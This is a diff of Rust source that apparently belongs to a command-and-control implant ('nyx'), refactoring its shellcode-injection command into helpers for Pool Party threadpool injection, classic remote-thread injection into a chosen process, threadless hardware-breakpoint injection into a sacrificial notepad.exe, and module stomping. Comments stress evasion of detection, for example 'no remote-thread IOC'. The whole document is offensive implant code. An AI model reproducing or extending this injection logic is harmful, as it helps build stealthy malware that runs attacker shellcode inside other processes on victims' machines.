@@ -1076,73 +1076,12 @@ unsafe fn threadless_inject_apply(
 ///
 /// Returns a `Response::Output` with a status line, or `Response::Err`.
 pub fn do_inject(method: u8, pid: u32, spawn_to: &str, shellcode: &[u8]) -> nyx_protocol::Response {
-    // PID safety guard. Reject targets that would brick the host or the
-    // beacon itself. This runs BEFORE any dispatch so future Pool Party /
-    // remote-inject paths inherit the same protection. pid == 0 is the
-    // documented "spawn a fresh sacrificial process" sentinel and is allowed.
-    // HIGH-severity finding in docs/audits/FULL_CODE_AUDIT_2026-07-21.md.
-    if pid == 4 {
-        // PID 4 = System (kernel); OpenProcess writes would BSOD.
-        return nyx_protocol::Response::Err(crate::heap::String::from(
-            "refuse inject into pid 4 (System kernel process)",
-        ));
+    if let Some(err) = do_inject_pid_guard(pid) {
+        return err;
     }
-    if pid != 0 && pid == crate::hostinfo::pid() {
-        // Self-inject serves no operational purpose and the operator almost
-        // certainly meant a different target (typo / stale tasking).
-        return nyx_protocol::Response::Err(crate::heap::String::from(
-            "refuse self-inject (target pid is the implant's own pid)",
-        ));
+    if let Some(resp) = do_inject_pool_party(method, pid, spawn_to, shellcode) {
+        return resp;
     }
-
-    // method 0 (Pool Party): gated research-grade technique. When
-    // POOL_PARTY_ENABLED is on (operator opt-in via NYX_POOL_PARTY_ON=1) AND a
-    // target pid is supplied, attempt the section-backed threadpool splice.
-    // On any failure (or when the gate is off / pid is 0), degrade to method 2
-    // (module stomp) so the command stays functional end-to-end.
-    if method == 0 && crate::tp::pool_party_enabled() && pid != 0 {
-        match unsafe { crate::tp::pool_party_inject(pid, shellcode) } {
-            Ok(()) => {
-                let mut msg = crate::heap::String::from("Pool Party inject ok (pid=");
-                let mut buf = [0u8; 10];
-                let mut n = pid;
-                let mut i = buf.len();
-                if n == 0 {
-                    buf[0] = b'0';
-                    i = 1;
-                } else {
-                    while n > 0 {
-                        i -= 1;
-                        buf[i] = b'0' + (n % 10) as u8;
-                        n /= 10;
-                    }
-                }
-                for &b in &buf[i..] {
-                    msg.push(b as char);
-                }
-                msg.push_str(") — section delivery ok, threadless worker-factory dispatch (no remote-thread IOC)");
-                return nyx_protocol::Response::Output(msg.into_bytes());
-            }
-            Err(e) => {
-                // Fall through to module stomp with a warning prefix.
-                let mut warn = crate::heap::String::from("WARN: Pool Party failed (");
-                warn.push_str(&e);
-                warn.push_str(") — falling back to module stomp (method 2). ");
-                // Use warn as the prefix for the module-stomp path below.
-                let resp = do_inject(2, pid, spawn_to, shellcode);
-                let prefixed = match resp {
-                    nyx_protocol::Response::Output(mut bytes) => {
-                        let mut out = warn.into_bytes();
-                        out.append(&mut bytes);
-                        nyx_protocol::Response::Output(out)
-                    }
-                    other => other,
-                };
-                return prefixed;
-            }
-        }
-    }
-
     // method 0 explicitly requested but not usable — return clear error
     // instead of silently degrading (operator needs to know).
     if method == 0 {
@@ -1151,99 +1090,161 @@ pub fn do_inject(method: u8, pid: u32, spawn_to: &str, shellcode: &[u8]) -> nyx_
              Set NYX_POOL_PARTY_ON=1 at build + supply pid, or use method 2.",
         ));
     }
+    do_inject_dispatch(method, pid, spawn_to, shellcode)
+}
+
+/// PID safety guard. Reject targets that would brick the host or the
+/// beacon itself. This runs BEFORE any dispatch so future Pool Party /
+/// remote-inject paths inherit the same protection. pid == 0 is the
+/// documented "spawn a fresh sacrificial process" sentinel and is allowed.
+/// HIGH-severity finding in docs/audits/FULL_CODE_AUDIT_2026-07-21.md.
+fn do_inject_pid_guard(pid: u32) -> Option<nyx_protocol::Response> {
+    if pid == 4 {
+        // PID 4 = System (kernel); OpenProcess writes would BSOD.
+        return Some(nyx_protocol::Response::Err(crate::heap::String::from(
+            "refuse inject into pid 4 (System kernel process)",
+        )));
+    }
+    if pid != 0 && pid == crate::hostinfo::pid() {
+        // Self-inject serves no operational purpose and the operator almost
+        // certainly meant a different target (typo / stale tasking).
+        return Some(nyx_protocol::Response::Err(crate::heap::String::from(
+            "refuse self-inject (target pid is the implant's own pid)",
+        )));
+    }
+    None
+}
+
+/// method 0 (Pool Party): gated research-grade technique. When
+/// POOL_PARTY_ENABLED is on (operator opt-in via NYX_POOL_PARTY_ON=1) AND a
+/// target pid is supplied, attempt the section-backed threadpool splice. On
+/// any failure (or when the gate is off / pid is 0), degrade to method 2
+/// (module stomp) so the command stays functional end-to-end. Returns
+/// `Some(response)` when the method-0 path handled the request.
+fn do_inject_pool_party(
+    method: u8,
+    pid: u32,
+    spawn_to: &str,
+    shellcode: &[u8],
+) -> Option<nyx_protocol::Response> {
+    if method != 0 || !crate::tp::pool_party_enabled() || pid == 0 {
+        return None;
+    }
+    match unsafe { crate::tp::pool_party_inject(pid, shellcode) } {
+        Ok(()) => {
+            let mut msg = crate::heap::String::from("Pool Party inject ok (pid=");
+            let mut buf = [0u8; 10];
+            let mut n = pid;
+            let mut i = buf.len();
+            if n == 0 {
+                buf[0] = b'0';
+                i = 1;
+            } else {
+                while n > 0 {
+                    i -= 1;
+                    buf[i] = b'0' + (n % 10) as u8;
+                    n /= 10;
+                }
+            }
+            for &b in &buf[i..] {
+                msg.push(b as char);
+            }
+            msg.push_str(") — section delivery ok, threadless worker-factory dispatch (no remote-thread IOC)");
+            Some(nyx_protocol::Response::Output(msg.into_bytes()))
+        }
+        Err(e) => {
+            // Fall through to module stomp with a warning prefix.
+            let mut warn = crate::heap::String::from("WARN: Pool Party failed (");
+            warn.push_str(&e);
+            warn.push_str(") — falling back to module stomp (method 2). ");
+            // Use warn as the prefix for the module-stomp path below.
+            let resp = do_inject(2, pid, spawn_to, shellcode);
+            let prefixed = match resp {
+                nyx_protocol::Response::Output(mut bytes) => {
+                    let mut out = warn.into_bytes();
+                    out.append(&mut bytes);
+                    nyx_protocol::Response::Output(out)
+                }
+                other => other,
+            };
+            Some(prefixed)
+        }
+    }
+}
+
+/// Method dispatch for the remaining paths: existing-process injection
+/// (method 2 + pid) and the sacrificial-process methods 1/2.
+fn do_inject_dispatch(
+    method: u8,
+    pid: u32,
+    spawn_to: &str,
+    shellcode: &[u8],
+) -> nyx_protocol::Response {
     let warn_prefix = crate::heap::String::new();
     let effective_method = method;
-
     // ---- Existing-process injection (method 2 + pid != 0) ----
     // implant-inject-5: dispatch on METHOD first. Only the classic-inject
     // contract (method 2) accepts an existing pid; method 1 (threadless HWBP)
     // requires a sacrificial process and must NOT silently degrade to the
     // loudest CreateRemoteThread path when given a pid.
     if pid != 0 {
-        if effective_method != 2 {
-            return nyx_protocol::Response::Err(crate::heap::String::from(
-                "inject: method 1 (threadless HWBP) targets a sacrificial process; \
-                 existing-pid injection is method 2 (classic remote thread) only",
-            ));
-        }
-        return match unsafe { inject_existing(pid, shellcode) } {
-            Ok(()) => {
-                let mut msg = warn_prefix;
-                msg.push_str("remote inject ok (pid=");
-                let mut buf = [0u8; 10];
-                let mut n = pid;
-                let mut i = buf.len();
-                if n == 0 {
-                    buf[0] = b'0';
-                    i = 1;
-                } else {
-                    while n > 0 {
-                        i -= 1;
-                        buf[i] = b'0' + (n % 10) as u8;
-                        n /= 10;
-                    }
-                }
-                // Append the u32→ASCII digits.
-                for &b in &buf[i..] {
-                    msg.push(b as char);
-                }
-                msg.push(')');
-                nyx_protocol::Response::Output(msg.into_bytes())
-            }
-            Err(e) => nyx_protocol::Response::Err(crate::heap::String::from(e)),
-        };
+        return do_inject_existing(effective_method, pid, shellcode, warn_prefix);
     }
-
     // ---- Sacrificial-process path (pid == 0) ----
-    match effective_method {
-        1 => {
-            let target = if spawn_to.is_empty() {
-                "notepad.exe"
+    do_inject_sacrificial(effective_method, spawn_to, shellcode, warn_prefix)
+}
+
+/// Existing-process injection (method 2 + pid != 0).
+fn do_inject_existing(
+    method: u8,
+    pid: u32,
+    shellcode: &[u8],
+    warn_prefix: crate::heap::String,
+) -> nyx_protocol::Response {
+    if method != 2 {
+        return nyx_protocol::Response::Err(crate::heap::String::from(
+            "inject: method 1 (threadless HWBP) targets a sacrificial process; \
+             existing-pid injection is method 2 (classic remote thread) only",
+        ));
+    }
+    match unsafe { inject_existing(pid, shellcode) } {
+        Ok(()) => {
+            let mut msg = warn_prefix;
+            msg.push_str("remote inject ok (pid=");
+            let mut buf = [0u8; 10];
+            let mut n = pid;
+            let mut i = buf.len();
+            if n == 0 {
+                buf[0] = b'0';
+                i = 1;
             } else {
-                spawn_to
-            };
-            match unsafe { create_sacrificial(target) } {
-                Ok(mut proc) => {
-                    let res = match unsafe {
-                        threadless_inject(proc.handle, proc.main_thread, shellcode)
-                    } {
-                        Ok(()) => {
-                            // The sacrificial's main thread is now executing
-                            // the shellcode — the Drop guard must NOT terminate
-                            // it (it only closes the handles on drop).
-                            proc.mark_resumed();
-                            let mut msg =
-                                crate::heap::String::from("threadless inject ok (sacrificial pid=");
-                            let mut buf = [0u8; 10];
-                            let mut n = proc.pid;
-                            let mut i = buf.len();
-                            if n == 0 {
-                                buf[0] = b'0';
-                                i = 1;
-                            } else {
-                                while n > 0 {
-                                    i -= 1;
-                                    buf[i] = b'0' + (n % 10) as u8;
-                                    n /= 10;
-                                }
-                            }
-                            for &b in &buf[i..] {
-                                msg.push(b as char);
-                            }
-                            msg.push(')');
-                            nyx_protocol::Response::Output(msg.into_bytes())
-                        }
-                        Err(e) => nyx_protocol::Response::Err(crate::heap::String::from(e)),
-                    };
-                    // The Drop guard on `proc` owns cleanup: on success it
-                    // closes the handles fire-and-forget; on failure it
-                    // terminates the suspended sacrificial + closes both
-                    // handles — no path leaks.
-                    res
+                while n > 0 {
+                    i -= 1;
+                    buf[i] = b'0' + (n % 10) as u8;
+                    n /= 10;
                 }
-                Err(e) => nyx_protocol::Response::Err(crate::heap::String::from(e)),
             }
+            // Append the u32→ASCII digits.
+            for &b in &buf[i..] {
+                msg.push(b as char);
+            }
+            msg.push(')');
+            nyx_protocol::Response::Output(msg.into_bytes())
         }
+        Err(e) => nyx_protocol::Response::Err(crate::heap::String::from(e)),
+    }
+}
+
+/// Sacrificial-process path (pid == 0): method 1 = threadless HWBP on a
+/// fresh sacrificial; method 2 = module stomp.
+fn do_inject_sacrificial(
+    method: u8,
+    spawn_to: &str,
+    shellcode: &[u8],
+    warn_prefix: crate::heap::String,
+) -> nyx_protocol::Response {
+    match method {
+        1 => do_inject_sacrificial_threadless(spawn_to, shellcode),
         2 => {
             if !modulestomp_enabled() {
                 // Disarmed: creating a sacrificial just to terminate it is
@@ -1271,6 +1272,57 @@ pub fn do_inject(method: u8, pid: u32, spawn_to: &str, shellcode: &[u8]) -> nyx_
             }
         }
         _ => nyx_protocol::Response::Err(crate::heap::String::from("unknown inject method")),
+    }
+}
+
+/// Method 1 on the sacrificial path: create the sacrificial process and
+/// threadless-inject into its suspended main thread.
+fn do_inject_sacrificial_threadless(spawn_to: &str, shellcode: &[u8]) -> nyx_protocol::Response {
+    let target = if spawn_to.is_empty() {
+        "notepad.exe"
+    } else {
+        spawn_to
+    };
+    match unsafe { create_sacrificial(target) } {
+        Ok(mut proc) => {
+            let res = match unsafe {
+                threadless_inject(proc.handle, proc.main_thread, shellcode)
+            } {
+                Ok(()) => {
+                    // The sacrificial's main thread is now executing
+                    // the shellcode — the Drop guard must NOT terminate
+                    // it (it only closes the handles on drop).
+                    proc.mark_resumed();
+                    let mut msg =
+                        crate::heap::String::from("threadless inject ok (sacrificial pid=");
+                    let mut buf = [0u8; 10];
+                    let mut n = proc.pid;
+                    let mut i = buf.len();
+                    if n == 0 {
+                        buf[0] = b'0';
+                        i = 1;
+                    } else {
+                        while n > 0 {
+                            i -= 1;
+                            buf[i] = b'0' + (n % 10) as u8;
+                            n /= 10;
+                        }
+                    }
+                    for &b in &buf[i..] {
+                        msg.push(b as char);
+                    }
+                    msg.push(')');
+                    nyx_protocol::Response::Output(msg.into_bytes())
+                }
+                Err(e) => nyx_protocol::Response::Err(crate::heap::String::from(e)),
+            };
+            // The Drop guard on `proc` owns cleanup: on success it
+            // closes the handles fire-and-forget; on failure it
+            // terminates the suspended sacrificial + closes both
+            // handles — no path leaks.
+            res
+        }
+        Err(e) => nyx_protocol::Response::Err(crate::heap::String::from(e)),
     }
 }
 
